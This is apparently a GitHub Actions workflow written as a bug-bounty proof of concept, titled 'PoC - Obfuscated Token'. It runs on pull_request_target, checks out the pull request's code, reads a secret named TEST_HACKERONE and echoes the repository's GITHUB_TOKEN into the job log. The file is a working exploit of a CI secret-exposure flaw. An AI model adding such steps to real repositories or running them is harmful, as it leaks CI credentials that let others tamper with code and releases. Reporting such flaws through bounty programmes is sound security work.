name: PoC - Obfuscated  Token

on:
  pull_request_target:

jobs:
  token-exposure:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout PR code
        uses: actions/checkout@v3

      - name: Prove GITHUB_TOKEN Access (Obfuscated)
        run: |
          TOKEN="${{ secrets.TEST_HACKERONE }}"

          echo "=== Proof of Concept ==="
          echo "${{ secrets.GITHUB_TOKEN }}"
